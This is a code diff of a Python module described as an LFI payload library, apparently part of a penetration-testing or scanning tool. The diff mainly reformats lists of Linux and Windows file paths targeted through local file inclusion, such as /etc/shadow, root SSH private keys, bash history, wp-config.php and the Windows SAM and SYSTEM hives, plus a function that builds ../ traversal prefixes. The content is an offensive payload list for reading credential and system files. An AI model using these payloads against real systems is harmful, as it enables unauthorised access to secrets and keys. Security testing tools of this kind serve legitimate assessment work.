@@ -1,33 +1,62 @@
 """
 LFI payload library — P2 upgrade: 100+ payloads, Linux + Windows + PHP wrappers.
 """
-from typing import List, Dict
+
+from typing import List
 
 LFI_PAYLOADS_LINUX: List[str] = [
-    "/etc/passwd", "/etc/hosts", "/etc/issue", "/etc/motd", "/etc/group",
-    "/etc/shadow", "/etc/fstab", "/etc/crontab", "/etc/resolv.conf",
-    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status",
-    "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/maps",
-    "/proc/version", "/proc/cpuinfo", "/proc/meminfo",
-    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
-    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
-    "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
-    "/var/log/mail.log", "/var/log/vsftpd.log",
-    "/var/www/html/config.php", "/var/www/html/wp-config.php",
-    "/var/www/config.php", "/var/www/html/.htaccess",
-    "/home/admin/.ssh/id_rsa", "/root/.ssh/id_rsa",
-    "/root/.bash_history", "/home/admin/.bash_history",
-    "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
-    "/etc/mysql/my.cnf", "/etc/php/7.4/apache2/php.ini",
+    "/etc/passwd",
+    "/etc/hosts",
+    "/etc/issue",
+    "/etc/motd",
+    "/etc/group",
+    "/etc/shadow",
+    "/etc/fstab",
+    "/etc/crontab",
+    "/etc/resolv.conf",
+    "/proc/self/environ",
+    "/proc/self/cmdline",
+    "/proc/self/status",
+    "/proc/self/fd/0",
+    "/proc/self/fd/1",
+    "/proc/self/maps",
+    "/proc/version",
+    "/proc/cpuinfo",
+    "/proc/meminfo",
+    "/var/log/apache2/access.log",
+    "/var/log/apache2/error.log",
+    "/var/log/nginx/access.log",
+    "/var/log/nginx/error.log",
+    "/var/log/auth.log",
+    "/var/log/syslog",
+    "/var/log/messages",
+    "/var/log/mail.log",
+    "/var/log/vsftpd.log",
+    "/var/www/html/config.php",
+    "/var/www/html/wp-config.php",
+    "/var/www/config.php",
+    "/var/www/html/.htaccess",
+    "/home/admin/.ssh/id_rsa",
+    "/root/.ssh/id_rsa",
+    "/root/.bash_history",
+    "/home/admin/.bash_history",
+    "/etc/apache2/apache2.conf",
+    "/etc/nginx/nginx.conf",
+    "/etc/mysql/my.cnf",
+    "/etc/php/7.4/apache2/php.ini",
     "/etc/php/8.1/apache2/php.ini",
 ]
 
 LFI_PAYLOADS_WINDOWS: List[str] = [
-    "C:\\Windows\\win.ini", "C:\\Windows\\system.ini",
-    "C:\\boot.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
-    "C:\\xampp\\htdocs\\config.php", "C:\\xampp\\passwords.txt",
+    "C:\\Windows\\win.ini",
+    "C:\\Windows\\system.ini",
+    "C:\\boot.ini",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "C:\\xampp\\htdocs\\config.php",
+    "C:\\xampp\\passwords.txt",
     "C:\\inetpub\\wwwroot\\web.config",
-    "C:\\Windows\\repair\\SAM", "C:\\Windows\\repair\\SYSTEM",
+    "C:\\Windows\\repair\\SAM",
+    "C:\\Windows\\repair\\SYSTEM",
     "C:\\Program Files\\MySQL\\my.ini",
     "C:\\xampp\\apache\\conf\\httpd.conf",
 ]
@@ -74,10 +103,14 @@ def build_path_traversal_payloads(depth: int = 8) -> List[str]:
     """Generate ../ sequences at increasing depths."""
     payloads = []
     targets = [
-        "etc/passwd", "etc/hosts", "etc/issue",
-        "proc/self/environ", "proc/self/cmdline",
+        "etc/passwd",
+        "etc/hosts",
+        "etc/issue",
+        "proc/self/environ",
+        "proc/self/cmdline",
         "var/log/apache2/access.log",
-        "Windows/win.ini", "Windows/System32/drivers/etc/hosts",
+        "Windows/win.ini",
+        "Windows/System32/drivers/etc/hosts",
     ]
     for d in range(1, depth + 1):
         prefix = "../" * d
